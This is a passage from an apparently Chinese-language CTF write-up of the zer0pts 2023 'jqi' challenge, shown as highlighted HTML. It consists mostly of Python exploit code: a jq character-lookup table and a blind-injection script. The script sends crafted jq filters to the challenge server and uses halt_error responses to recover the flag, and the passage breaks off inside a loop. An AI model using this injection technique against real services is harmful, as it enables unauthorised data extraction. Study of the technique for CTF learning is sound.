</span></span><span class=line><span class=cl>        <span class=k>except</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>pass</span>
</span></span><span class=line><span class=cl>            <span class=c1># print(&#34;找不到: &#34; + i)</span>
</span></span><span class=line><span class=cl>            <span class=c1># 找不到 q、j</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>getstr4</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=mi>10</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;&#34;</span><span class=si>{</span><span class=n>i</span><span class=si>}</span><span class=s1>&#34;:&#34;(</span><span class=si>{</span><span class=n>i</span><span class=si>}</span><span class=s1>|tostring)&#34;,&#39;</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>最终得出</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>list1</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;a&#34;</span><span class=p>:</span> <span class=s2>&#34;(.[3].flag[56:57])&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;A&#34;</span><span class=p>:</span> <span class=s2>&#34;(.[3].flag[56:57]|ascii_upcase)&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;b&#34;</span><span class=p>:</span> <span class=s2>&#34;(.[3].flag[83:84])&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;B&#34;</span><span class=p>:</span> <span class=s2>&#34;(.[3].flag[83:84]|ascii_upcase)&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;c&#34;</span><span class=p>:</span> <span class=s2>&#34;(.[3].flag[72:73])&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;C&#34;</span><span class=p>:</span> <span class=s2>&#34;(.[3].flag[72:73]|ascii_upcase)&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;d&#34;</span><span class=p>:</span> <span class=s2>&#34;(.[3].flag[81:82])&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;D&#34;</span><span class=p>:</span> <span class=s2>&#34;(.[3].flag[81:82]|ascii_upcase)&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;e&#34;</span><span class=p>:</span> <span class=s2>&#34;(.[3].flag[1:2])&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;E&#34;</span><span class=p>:</span> <span class=s2>&#34;(.[3].flag[1:2]|ascii_upcase)&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;f&#34;</span><span class=p>:</span> <span class=s2>&#34;(.[3].flag[60:61])&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;F&#34;</span><span class=p>:</span> <span class=s2>&#34;(.[3].flag[60:61]|ascii_upcase)&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;g&#34;</span><span class=p>:</span> <span class=s2>&#34;(.[3].flag[13:14])&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;G&#34;</span><span class=p>:</span> <span class=s2>&#34;(.[3].flag[13:14]|ascii_upcase)&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;h&#34;</span><span class=p>:</span> <span class=s2>&#34;(.[3].flag[25:26])&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;H&#34;</span><span class=p>:</span> <span class=s2>&#34;(.[3].flag[25:26]|ascii_upcase)&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;m&#34;</span><span class=p>:</span> <span class=s2>&#34;(.[3].flag[8:9])&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;M&#34;</span><span class=p>:</span> <span class=s2>&#34;(.[3].flag[8:9]|ascii_upcase)&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;n&#34;</span><span class=p>:</span> <span class=s2>&#34;(.[3].flag[21:22])&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;N&#34;</span><span class=p>:</span> <span class=s2>&#34;(.[3].flag[21:22]|ascii_upcase)&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;p&#34;</span><span class=p>:</span> <span class=s2>&#34;(.[3].flag[4:5])&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;P&#34;</span><span class=p>:</span> <span class=s2>&#34;(.[3].flag[4:5]|ascii_upcase)&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;r&#34;</span><span class=p>:</span> <span class=s2>&#34;(.[3].flag[2:3])&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;R&#34;</span><span class=p>:</span> <span class=s2>&#34;(.[3].flag[2:3]|ascii_upcase)&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;s&#34;</span><span class=p>:</span> <span class=s2>&#34;(.[3].flag[6:7])&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;S&#34;</span><span class=p>:</span> <span class=s2>&#34;(.[3].flag[6:7]|ascii_upcase)&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;t&#34;</span><span class=p>:</span> <span class=s2>&#34;(.[3].flag[5:6])&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;T&#34;</span><span class=p>:</span> <span class=s2>&#34;(.[3].flag[5:6]|ascii_upcase)&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;u&#34;</span><span class=p>:</span> <span class=s2>&#34;(.[3].flag[27:28])&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;U&#34;</span><span class=p>:</span> <span class=s2>&#34;(.[3].flag[27:28]|ascii_upcase)&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;z&#34;</span><span class=p>:</span> <span class=s2>&#34;(.[3].flag[0:1])&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;Z&#34;</span><span class=p>:</span> <span class=s2>&#34;(.[3].flag[0:1]|ascii_upcase)&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;k&#34;</span><span class=p>:</span> <span class=s2>&#34;(.[4].flag[47:48])&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;K&#34;</span><span class=p>:</span> <span class=s2>&#34;(.[4].flag[47:48]|ascii_upcase)&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;l&#34;</span><span class=p>:</span> <span class=s2>&#34;(.[4].flag[55:56])&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;L&#34;</span><span class=p>:</span> <span class=s2>&#34;(.[4].flag[55:56]|ascii_upcase)&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;o&#34;</span><span class=p>:</span> <span class=s2>&#34;(.[4].flag[38:39])&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;O&#34;</span><span class=p>:</span> <span class=s2>&#34;(.[4].flag[38:39]|ascii_upcase)&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;y&#34;</span><span class=p>:</span> <span class=s2>&#34;(.[4].flag[56:57])&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;Y&#34;</span><span class=p>:</span> <span class=s2>&#34;(.[4].flag[56:57]|ascii_upcase)&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;/&#34;</span><span class=p>:</span> <span class=s2>&#34;(.[4].flag[30:31])&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;=&#34;</span><span class=p>:</span> <span class=s2>&#34;(.[4].flag[48:49])&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;v&#34;</span><span class=p>:</span> <span class=s2>&#34;(.[0].flag[44:45])&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;V&#34;</span><span class=p>:</span> <span class=s2>&#34;(.[0].flag[44:45]|ascii_upcase)&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;i&#34;</span><span class=p>:</span> <span class=s2>&#34;(.[0].flag[32:33])&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;I&#34;</span><span class=p>:</span> <span class=s2>&#34;(.[0].flag[32:33]|ascii_upcase)&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;x&#34;</span><span class=p>:</span> <span class=s2>&#34;(.[0].name[9:10])&#34;</span><span class=p>,</span> <span class=c1>#手动的</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;X&#34;</span><span class=p>:</span> <span class=s2>&#34;(.[0].name[9:10]|ascii_upcase)&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;w&#34;</span><span class=p>:</span> <span class=s2>&#34;(.[0].tags[0][0:1])&#34;</span><span class=p>,</span> <span class=c1>#手动的</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;W&#34;</span><span class=p>:</span> <span class=s2>&#34;(.[0].tags[0][0:1]|ascii_upcase)&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;j&#34;</span><span class=p>:</span> <span class=s2>&#34;((8881123345666755|@base64)[17:18])&#34;</span><span class=p>,</span> <span class=c1>#手动的</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;J&#34;</span><span class=p>:</span> <span class=s2>&#34;((8881123345666755|@base64)[17:18]|ascii_upcase)&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;q&#34;</span><span class=p>:</span> <span class=s2>&#34;((1|@base64)[1:2]|ascii_downcase)&#34;</span><span class=p>,</span> <span class=c1>#手动的</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;Q&#34;</span><span class=p>:</span> <span class=s2>&#34;((1|@base64)[1:2])&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;0&#34;</span><span class=p>:</span><span class=s2>&#34;(0|tostring)&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;1&#34;</span><span class=p>:</span><span class=s2>&#34;(1|tostring)&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;2&#34;</span><span class=p>:</span><span class=s2>&#34;(2|tostring)&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;3&#34;</span><span class=p>:</span><span class=s2>&#34;(3|tostring)&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;4&#34;</span><span class=p>:</span><span class=s2>&#34;(4|tostring)&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;5&#34;</span><span class=p>:</span><span class=s2>&#34;(5|tostring)&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;6&#34;</span><span class=p>:</span><span class=s2>&#34;(6|tostring)&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;7&#34;</span><span class=p>:</span><span class=s2>&#34;(7|tostring)&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;8&#34;</span><span class=p>:</span><span class=s2>&#34;(8|tostring)&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;9&#34;</span><span class=p>:</span><span class=s2>&#34;(9|tostring)&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>然后利用halt_error来导致不一样的回显，配合if语句进行盲注即可</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span><span class=lnt>78
</span><span class=lnt>79
</span><span class=lnt>80
</span><span class=lnt>81
</span><span class=lnt>82
</span><span class=lnt>83
</span><span class=lnt>84
</span><span class=lnt>85
</span><span class=lnt>86
</span><span class=lnt>87
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>string</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>list1</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;a&#34;</span><span class=p>:</span> <span class=s2>&#34;(.[3].flag[56:57])&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;A&#34;</span><span class=p>:</span> <span class=s2>&#34;(.[3].flag[56:57]|ascii_upcase)&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;b&#34;</span><span class=p>:</span> <span class=s2>&#34;(.[3].flag[83:84])&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;B&#34;</span><span class=p>:</span> <span class=s2>&#34;(.[3].flag[83:84]|ascii_upcase)&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;c&#34;</span><span class=p>:</span> <span class=s2>&#34;(.[3].flag[72:73])&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;C&#34;</span><span class=p>:</span> <span class=s2>&#34;(.[3].flag[72:73]|ascii_upcase)&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;d&#34;</span><span class=p>:</span> <span class=s2>&#34;(.[3].flag[81:82])&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;D&#34;</span><span class=p>:</span> <span class=s2>&#34;(.[3].flag[81:82]|ascii_upcase)&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;e&#34;</span><span class=p>:</span> <span class=s2>&#34;(.[3].flag[1:2])&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;E&#34;</span><span class=p>:</span> <span class=s2>&#34;(.[3].flag[1:2]|ascii_upcase)&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;f&#34;</span><span class=p>:</span> <span class=s2>&#34;(.[3].flag[60:61])&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;F&#34;</span><span class=p>:</span> <span class=s2>&#34;(.[3].flag[60:61]|ascii_upcase)&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;g&#34;</span><span class=p>:</span> <span class=s2>&#34;(.[3].flag[13:14])&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;G&#34;</span><span class=p>:</span> <span class=s2>&#34;(.[3].flag[13:14]|ascii_upcase)&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;h&#34;</span><span class=p>:</span> <span class=s2>&#34;(.[3].flag[25:26])&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;H&#34;</span><span class=p>:</span> <span class=s2>&#34;(.[3].flag[25:26]|ascii_upcase)&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;m&#34;</span><span class=p>:</span> <span class=s2>&#34;(.[3].flag[8:9])&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;M&#34;</span><span class=p>:</span> <span class=s2>&#34;(.[3].flag[8:9]|ascii_upcase)&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;n&#34;</span><span class=p>:</span> <span class=s2>&#34;(.[3].flag[21:22])&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;N&#34;</span><span class=p>:</span> <span class=s2>&#34;(.[3].flag[21:22]|ascii_upcase)&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;p&#34;</span><span class=p>:</span> <span class=s2>&#34;(.[3].flag[4:5])&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;P&#34;</span><span class=p>:</span> <span class=s2>&#34;(.[3].flag[4:5]|ascii_upcase)&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;r&#34;</span><span class=p>:</span> <span class=s2>&#34;(.[3].flag[2:3])&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;R&#34;</span><span class=p>:</span> <span class=s2>&#34;(.[3].flag[2:3]|ascii_upcase)&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;s&#34;</span><span class=p>:</span> <span class=s2>&#34;(.[3].flag[6:7])&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;S&#34;</span><span class=p>:</span> <span class=s2>&#34;(.[3].flag[6:7]|ascii_upcase)&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;t&#34;</span><span class=p>:</span> <span class=s2>&#34;(.[3].flag[5:6])&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;T&#34;</span><span class=p>:</span> <span class=s2>&#34;(.[3].flag[5:6]|ascii_upcase)&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;u&#34;</span><span class=p>:</span> <span class=s2>&#34;(.[3].flag[27:28])&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;U&#34;</span><span class=p>:</span> <span class=s2>&#34;(.[3].flag[27:28]|ascii_upcase)&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;z&#34;</span><span class=p>:</span> <span class=s2>&#34;(.[3].flag[0:1])&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;Z&#34;</span><span class=p>:</span> <span class=s2>&#34;(.[3].flag[0:1]|ascii_upcase)&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;k&#34;</span><span class=p>:</span> <span class=s2>&#34;(.[4].flag[47:48])&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;K&#34;</span><span class=p>:</span> <span class=s2>&#34;(.[4].flag[47:48]|ascii_upcase)&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;l&#34;</span><span class=p>:</span> <span class=s2>&#34;(.[4].flag[55:56])&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;L&#34;</span><span class=p>:</span> <span class=s2>&#34;(.[4].flag[55:56]|ascii_upcase)&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;o&#34;</span><span class=p>:</span> <span class=s2>&#34;(.[4].flag[38:39])&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;O&#34;</span><span class=p>:</span> <span class=s2>&#34;(.[4].flag[38:39]|ascii_upcase)&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;y&#34;</span><span class=p>:</span> <span class=s2>&#34;(.[4].flag[56:57])&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;Y&#34;</span><span class=p>:</span> <span class=s2>&#34;(.[4].flag[56:57]|ascii_upcase)&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;/&#34;</span><span class=p>:</span> <span class=s2>&#34;(.[4].flag[30:31])&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;=&#34;</span><span class=p>:</span> <span class=s2>&#34;(.[4].flag[48:49])&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;v&#34;</span><span class=p>:</span> <span class=s2>&#34;(.[0].flag[44:45])&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;V&#34;</span><span class=p>:</span> <span class=s2>&#34;(.[0].flag[44:45]|ascii_upcase)&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;i&#34;</span><span class=p>:</span> <span class=s2>&#34;(.[0].flag[32:33])&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;I&#34;</span><span class=p>:</span> <span class=s2>&#34;(.[0].flag[32:33]|ascii_upcase)&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;x&#34;</span><span class=p>:</span> <span class=s2>&#34;(.[0].name[9:10])&#34;</span><span class=p>,</span> <span class=c1>#手动的</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;X&#34;</span><span class=p>:</span> <span class=s2>&#34;(.[0].name[9:10]|ascii_upcase)&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;w&#34;</span><span class=p>:</span> <span class=s2>&#34;(.[0].tags[0][0:1])&#34;</span><span class=p>,</span> <span class=c1>#手动的</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;W&#34;</span><span class=p>:</span> <span class=s2>&#34;(.[0].tags[0][0:1]|ascii_upcase)&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;j&#34;</span><span class=p>:</span> <span class=s2>&#34;((8881123345666755|@base64)[17:18])&#34;</span><span class=p>,</span> <span class=c1>#手动的</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;J&#34;</span><span class=p>:</span> <span class=s2>&#34;((8881123345666755|@base64)[17:18]|ascii_upcase)&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;q&#34;</span><span class=p>:</span> <span class=s2>&#34;((1|@base64)[1:2]|ascii_downcase)&#34;</span><span class=p>,</span> <span class=c1>#手动的</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;Q&#34;</span><span class=p>:</span> <span class=s2>&#34;((1|@base64)[1:2])&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;0&#34;</span><span class=p>:</span><span class=s2>&#34;(0|tostring)&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;1&#34;</span><span class=p>:</span><span class=s2>&#34;(1|tostring)&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;2&#34;</span><span class=p>:</span><span class=s2>&#34;(2|tostring)&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;3&#34;</span><span class=p>:</span><span class=s2>&#34;(3|tostring)&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;4&#34;</span><span class=p>:</span><span class=s2>&#34;(4|tostring)&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;5&#34;</span><span class=p>:</span><span class=s2>&#34;(5|tostring)&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;6&#34;</span><span class=p>:</span><span class=s2>&#34;(6|tostring)&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;7&#34;</span><span class=p>:</span><span class=s2>&#34;(7|tostring)&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;8&#34;</span><span class=p>:</span><span class=s2>&#34;(8|tostring)&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;9&#34;</span><span class=p>:</span><span class=s2>&#34;(9|tostring)&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>test</span><span class=p>(</span><span class=n>a</span><span class=p>,</span><span class=n>index</span><span class=p>,</span><span class=n>c</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>url</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;http://jqi.2023.zer0pts.com:8300/api/search?keys=flag&amp;conds=1\%20in%20flag,)|1)]|(  if ((</span><span class=si>{</span><span class=n>a</span><span class=si>}</span><span class=s2>|@base64)[</span><span class=si>{</span><span class=n>index</span><span class=si>}</span><span class=s2>:</span><span class=si>{</span><span class=n>index</span><span class=o>+</span><span class=mi>1</span><span class=si>}</span><span class=s2>] == </span><span class=si>{</span><span class=n>list1</span><span class=p>[</span><span class=n>c</span><span class=p>]</span><span class=si>}</span><span class=s2>) then halt_error else 1 end )%23|%20in%20flag&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>fh</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>url</span><span class=p>)</span><span class=o>.</span><span class=n>text</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=ow>not</span> <span class=s2>&#34;sorry, you cannot use filters in demo version&#34;</span> <span class=ow>in</span> <span class=n>fh</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>True</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>flagb64</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>50</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>j</span><span class=p>)</span>
